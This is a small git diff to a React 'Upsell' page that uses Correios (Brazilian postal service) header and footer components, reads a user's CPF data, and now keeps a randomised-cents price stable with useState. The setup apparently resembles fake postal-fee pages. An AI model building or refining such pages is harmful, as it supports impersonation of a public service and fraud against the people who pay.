@@ -1,4 +1,4 @@
-import { useEffect } from "react";
+import { useEffect, useState } from "react";
 import { useNavigate, useLocation, useParams } from "react-router-dom";
 import CorreiosHeader from "@/components/CorreiosHeader";
 import CorreiosFooter from "@/components/CorreiosFooter";
@@ -40,7 +40,7 @@ const Upsell = () => {
   const currentIndex = stepNumber - 1;
   const currentUpsell = UPSELLS[currentIndex];
 
-  const valorComCentavos = currentUpsell.valor + (Math.floor(Math.random() * 99) + 1) / 100;
+  const [valorComCentavos] = useState(() => currentUpsell.valor + (Math.floor(Math.random() * 99) + 1) / 100);
 
   const session = getSession();
   const cpfData: CPFData | undefined = location.state?.cpfData || session?.cpfData;
